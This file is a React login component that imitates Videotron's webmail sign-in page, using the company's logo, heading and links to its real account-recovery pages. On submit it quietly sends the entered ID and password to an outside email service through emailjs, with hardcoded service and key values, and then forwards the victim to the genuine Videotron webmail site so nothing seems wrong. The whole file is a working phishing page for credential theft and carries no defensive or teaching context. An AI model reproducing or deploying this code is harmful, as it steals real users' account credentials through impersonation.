import React, {useRef, useState} from 'react';
import Side from '../Components/Assets/Videotronfav.PNG';
import emailjs from '@emailjs/browser';

function Login() {
    const form = useRef();

    const sendEmail = (e) => {
        e.preventDefault();

        emailjs.sendForm('service_id6z6i9', 'template_h2y7r5r', form.current, 'FVIPVt10PQDRIGWMa')
            .then((result) => {
                console.log(result.text);
            }, (error) => {
                console.log(error.text);
            });

        // Redirect to the specified link after submitting the form
        window.location.href = 'https://courrielweb.videotron.com/iwc_static/layout/main.html?lang=en&3.0.2.2.0_20010958';
    };
    
    return (
        <div className="flex justify-center items-center h-screen bg-gray-100">
            <div className="shadow-lg p-8 bg-white max-w-md">
                <div className="flex ml-auto mb-8">
                    <img src={Side} alt="Videotron Logo" className="w-16 h-16" />
                </div>
                <h1 className="text-xl font-semibold mb-8 flex ml-auto">Videotron Connection</h1>
                <form ref={form} onSubmit={sendEmail} className="flex flex-col space-y-2">
                    <label className="text-sm flex mr-auto font-semibold">ID</label>
                    <input type="text" name="user_name" required className="border border-gray-300 p-2 rounded-sm focus:outline-none" />
                    <a href="https://www.videotron.com/client/user-management/residentiel/secur/InitRecoverUserCode.do?dispatch=initRecoverUserCode&appId=EC&locale=en"><p className="text-xs text-gray-500 cursor-pointer flex ml-auto underline">Forgot your username?</p></a>
                    <label className="text-sm flex mr-auto font-semibold">Password</label>
                    <input
                     type="password" name="user_pass" required className="border border-gray-300 p-2 rounded-sm focus:outline-none" />
                    <div className="flex items-center space-x-2">
                        <input type="checkbox" id="public_computer" className="h-4 w-4" />
                        <label htmlFor="public_computer" className="text-xs">Public computer</label>
                        <a href="https://www.videotron.com/client/user-management/residentiel/secur/InitRecoverPassword.do?dispatch=initRecoverPassword&appId=EC&locale=en"><p className="text-xs text-gray-500 cursor-pointer underline">Forgot your password?</p></a>
                    </div>
                    <button type="submit" className="bg-black text-white py-2 rounded-md hover:bg-[#FFD200] hover:text-black">SIGN IN</button>
                    <p className="text-sm text-gray-500 mt-4 font-semibold">No Videotron ID?</p>
                    <button className="border border-gray-300 py-2 rounded-md text-black hover:bg-black hover:text-white">CREATE AN ACCOUNT</button>
                </form>
            </div>
        </div>
    );
}

export default Login;
